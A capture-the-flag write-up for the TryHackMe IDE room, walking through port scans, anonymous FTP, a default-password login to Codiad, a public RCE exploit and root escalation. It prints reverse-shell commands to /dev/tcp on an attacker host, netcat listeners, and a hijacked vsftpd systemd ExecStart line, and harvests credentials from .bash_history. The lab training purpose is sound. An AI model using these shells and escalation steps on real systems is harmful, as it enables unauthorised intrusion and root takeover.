# IDE
This writeup is intended for IDE room in [TryHackMe](https://tryhackme.com).

Table of Contents
=================
* [URL](#URL)
* [Introduction](#Introduction)
	* [Port scan](#Port-scan)
	* [Further port scan](#Further-port-scan)
* [FTP login](#FTP-login)
* [HTTP login](#HTTP-login)
* [Exploiting HTTP server](#Exploiting-HTTP-server)
* [Privillege Escalation](#Privillege-Escalation)
	* [Home Directory](#Home-Directory)
	* [SSH Login](#SSH-Login)
	* [FTP Exploitation](#FTP-Exploitation)

# URL

URL to the IDE room is: https://tryhackme.com/room/ide\
Clickable URL to the room is provided [here](https://tryhackme.com/room/ide)

# Introduction

IDE is an easy difficulty box intended for further developing enumeration skills.
The task is to gain shell access on the box and escalate privilleges.

## Port scan
I started this room with simple port scan using `nmap`. The command I have used was `sudo nmap -vv -sS -oN -p- initial_scan.txt IP`. Explanation of the used flags is presented below:

```
sudo - gives nmap root privilleges.
-vv - verbosity. Prints out more information about what the nmap scan is doing.
-sS - SYN (stealth) scan. Checks the status of ports by initiating TCP connections but never completing them.
-p- - specify ports to be scanned. Hyphen (-) indicates to scan all 65535 ports.
-oN - normal output is redirected to a given filename (in this case - initial_scan.txt).
IP - IP address of the target machine.
```

Finished scan found ***4*** open TCP ports. These ports are: ***21***, ***22***, ***80*** and ***62337***.

## Further port scan

Now let's do a more throughout scan of these ports with the command `nmap -vv -A -p 21,22,80,62337 -oN open_ports.txt IP`. Expanation for this command is presented below:

```
-vv - verbosity. Prints out more information about what the nmap scan is doing.
-A - aggresive scan options. Enables OS edection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute) flags.
-p - specify ports to scan.
-oN - normal output is redirected to a given filename (in this case - open_ports.txt).
IP - IP address of the target machine.
```

This scan gave more information about the ports open and services running on top of them. Let's take a look at the newly found information:
1. Port `21` is running FTP service and it's version `vsftpd 3.0.3`.
	a. ftp-anon script scan results indicates that Anonymous FTP login is allowed.
2. Port `22` is running SSH service.
3. Port `80` is running Apache HTTP service.
4. Port `62337` is running another HTTP service.
	a. http-title of this server is Codiad 2.8.4. This specific version of Codiad has a vulnerability which allows Remote Code Execution (RCE) attacks and is a possible attack vector for privillege escalation on this system.

# FTP login

Next I will try anonymous login to the FTP service. The command for connecting to the FTP server is `ftp IP`, where `IP` is IP address of the target machine. When prompted for Username, type `anonymous` and leave the Password field empty.
When I had logged in to the FTP server, strangely I found no files in here. So I have used the `ls -lah` command for more information and found ***three*** directories here:
1. `.` and `..` are standard directories on UNIX-like operating systems.
2. `...` is ***not*** a standard directory.
I went to this directory with `cd` command and found a `-` file, which I have downloaded to host machine with FTP's `GET` command.
Then I have changed the name of the file from `-` to a `file` and gave it a `.txt` extension.
After that I have opened the file with a text editor and found a message in here:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

This gives us a couple of usernames - `john` and `drac`. Also, it says that the password for user `john` has been reset and is set to default. Likely, this is the user of the webserver at port `62337`. Well, if the user has default password, it should not be hard to guess it... :)

# HTTP login

So I have logged into the server via `Firefox` browser with the username `john` and password `password` and it opens an web-based ***Codiad 2.8.4*** administration panel with some python scripts. Based on the scripts, this server is used for controlling IP cameras and is the one we need to gain shell access to.

# Exploiting HTTP server

The specific Codiad version used in this box has a well described remote shell upload vulnerability, for which the code can be found [on the exploit-db site here](https://www.exploit-db.com/exploits/49705).
	So, I have downloaded this exploit to the attackbox and named it `codiad_exploit.py`. Following parameters needs to be specified for the script to run successfully:
1. ***URL*** of the target webserver. It consists of ***IP address*** and the ***Port number*** of the target webserver.
2. ***Username*** of the webserver's user.
3. ***Password*** of the same user.
4. ***IP address*** of the attacking machine.
5. ***Port*** that is used to listen to the reverse shell.
6. ***Platform*** that is running on the server (Windows or Linux).
7. When I opened Codiad administration panel within Firefox I found out that the files within the server are located in `/var/www/html` directory, so it can be conducted that this webserver is hosting Linux.

For succesfully running this exploit, ***3 terminal instances*** need to be used:
1. In ***the first terminal***, the command for server exploitation is constructed - `python3 codiad_exploit.py http://<target-ip>:<target-port> john [REDACTED] <attacker-ip> <listening-port> linux`.
2. From the exploit a reverse shell command is given to execute on a ***second terminal***. Command for this is: `echo 'bash -c "bash -i > /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1 2>&1"' | nc -lnvp <listening-port>`.
3. On the ***third terminal*** a ***netcat listener*** is set up. Command for this is `nc -lnvp <listening-port>+1`.

After the payload is sent, on the terminal with netcat listener there is an access to the target's shell - `www-data@ide`.

# Privillege Escalation

## Home Directory

Now it is necessary to navigate to the webserver's ***home*** directory. There is the folder for user `drac`. Within this directory there is the `user.txt` file. Although permission to view this file is denied at this stage. Luckily, `.bash_history` file is readable and contains the `mysql` user `drac` and this user's password.

## SSH Login

Although previously found credentials were intended for mysql, I have tried to SSH into the webserver with them and I succeeded to do that. Now I am inside a directory, where I ***have*** permissions to read `user.txt` file. Now it is possible to read this flag - a task that I will leave to the reader :)

## FTP Exploitation

By further analyzing the compromised system I was able to find out that the user `drac` is able to run `sudo` command. On `ide` server it can run `/usr/sbin/service vsftpd restart` command.
By using `locate` command I will search for `vsftpd.service` file.
The command gives back a bunch of `vsftpd.service` files but the most interesting one is located at `/lib/systemd/system/vsftpd.service` - this one can be written to by the user `drac`. It is possible to add a ***reverse shell payload*** to this file, so that when the FTP service is restarted, the server automatically connects to the listener that was set up earlier and gives root access to it.
When this file is opened, `ExecStart=` command needs to be changed to the reverse shell payload:

`ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1'`

Save the file and restart FTP service with `sudo /usr/sbin/service vsftpd restart`. It gives a warning to reload units with `systemctl daemon-reload`. Reload the units and restart the FTP service again. Volia, the netcat listener should have access to the root shell of the webserver!
Now navigate to the `root` folder and grab the flag from the `root.txt`file :)
